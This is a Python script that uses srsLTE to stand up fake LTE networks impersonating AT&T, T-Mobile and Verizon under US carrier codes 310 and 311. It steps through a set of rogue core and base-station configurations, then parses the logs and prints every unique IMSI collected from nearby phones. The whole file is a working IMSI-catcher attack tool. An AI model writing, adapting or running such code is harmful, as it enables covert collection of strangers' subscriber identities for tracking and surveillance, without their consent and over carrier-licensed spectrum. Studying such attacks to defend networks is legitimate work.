import os
import subprocess
import time
import os.path
import signal

# Initializes the variables to be used by the rest of the program
# This is where changes in directorys, output files, etc. should go
def init():
    prefix = "/home/gray/.config/srslte/POC/"
    conf = ".conf"
    carriers = ["ATT", "TMobile", "Verizon"]
    MCC = ["310", "311"]
    outputFile = "output.txt"
    pwd = "/home/gray/wireless/Project/devs/srsLTE/build"
    return [prefix, conf, carriers, MCC, outputFile, pwd]

# Function that controls the configuration execution of srsLTE
# Runs every configuration set for 15s
def runConfigs(prefix, conf, carriers, MCC, outputFile, pwd):
    print("Setting the pwd to srslte directory...")
    os.system("cd " + pwd)

    # Loop through all carriers
    with open(outputFile, 'w') as output:
        for carrier in carriers:
            print("Loading %s Configuration Files" % carrier)
            epcCarrierPrefix = prefix + carrier + "/" + carrier + "epc_"
            epcNum = 0 # Keeps track of the number epc configuration file to be used under the MCC
            # Loop through applicable MCCs
            for i in MCC:
                epcFile = epcCarrierPrefix + i + "_" + str(epcNum) + conf
                # Loop through all epc files with the correct MCC
                while( os.path.isfile(epcFile) ):
                    enbNum = 0 # Keeps track of the number enb configuration file to be used under the epc
                    print("\tLoading epc configuration: %s" % epcFile)
                    epcargs = ["srsepc", epcFile]
                    enbFile = prefix + carrier + "/" + carrier + "enb_" + i + "_" + str(epcNum) + "_" + str(enbNum) + conf
                    epc = subprocess.Popen(epcargs, stdout=output)
                    print("\tRunning epc...")
                    # Loop through all enb files coorelating to the epc file
                    while( os.path.isfile(enbFile) ):
                        print("\t\tLoading enb configuration: %s" % enbFile)
                        enbargs = ["srsenb", enbFile]
                        enb = subprocess.Popen(enbargs, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
                        print("\t\tRunning enb...")
                        time.sleep(30) # Run for 15s
                        print("\t\tTerminating enb...")
                        os.kill(enb.pid, signal.SIGTERM) # Terminate the enb backround process
                        time.sleep(5) # Allow time for graceful enb shutdown
                        enbNum += 1
                        enbFile = prefix + carrier + "/" + carrier + "enb_" + i + "_" + str(epcNum) + "_" + str(enbNum) + conf
                    print("\tTerminating epc...")
                    os.kill(epc.pid, signal.SIGTERM) # Terminate the epc backgroud process
                    time.sleep(5) # Allow time for graceful epc shutdown
                    epcNum += 1
                    epcFile = epcCarrierPrefix + i + "_" + str(epcNum) + conf

# Finds IMSIs contained within the output file and returns them as a set
# preventing multiple enumerations of the same IMSI
def findIMSI(outputFile):
    IMSI = set()
    with open(outputFile, 'r') as output:
        content = output.readlines()
        for line in content:
            line = line.split(" ")
            if "IMSI:" in line:
                index = 0
                for i in range(len(line)):
                    if(line[i] == "IMSI:"):
                        index = i+1
                IMSI.add(line[index])
    return IMSI




initConf = init()
runConfigs(initConf[0], initConf[1], initConf[2], initConf[3], initConf[4], initConf[5])
IMSI = findIMSI(initConf[4])

# Print all IMSIs found
if len(IMSI) == 0:
    print("No IMSIs found...")
else:
    print("IMSIs found!")
    for i in IMSI:
        print("IMSI: " + i)
